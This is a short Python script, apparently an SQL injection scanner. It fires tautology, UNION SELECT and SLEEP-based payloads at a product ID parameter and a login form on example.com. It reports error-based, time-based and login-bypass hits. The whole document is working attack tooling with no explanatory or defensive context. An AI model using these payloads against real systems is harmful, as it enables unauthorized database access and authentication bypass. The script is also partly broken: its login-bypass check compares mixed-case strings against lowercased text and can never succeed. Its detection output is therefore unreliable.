import requests
import time

url = "https://example.com/product?id="
login_url = "https://example.com/login"

payloads = [
         "1' OR '1'='1",
         "1' OR 'a'='a",
         "' UNION SELECT null, version() --",
         "1' AND (SELECT SLEEP(5)) --"
]

def test_get_sqli(url):
    print(f"[+] Starting Get-Based SQLi test...")
    for payload in payloads:
        full_url = url + payload
        start_time = time.time()
        response = requests.get(full_url)
        end_time = time.time()

        if "syntax error" in response.text.lower() or "mysql" in response.text.lower():
            print(f"[!] SQLi found! Payload: {payload}")
        elif end_time - start_time > 4:
            print(f"[!] Blind SQLi found!")
        else:
            print(f"[-] SAFE")

def test_post_sqli(url, login_url):
    print(f"[!] Starting POST based SQLi test...")
    for payload in payloads:
        data = {
            "username": payload,
            "password": "password"
        }
        response = requests.post(login_url, data=data)

        if "Welcome Admin" in response.text.lower() or "Dashboard" in response.text.lower():
            print(f"[+] Login bypassed! Payload: {payload}")
        else:
            print(f"[-] Failed: {payload}")

if __name__ == "__main__":
    test_get_sqli(url)
    test_post_sqli(url, login_url)
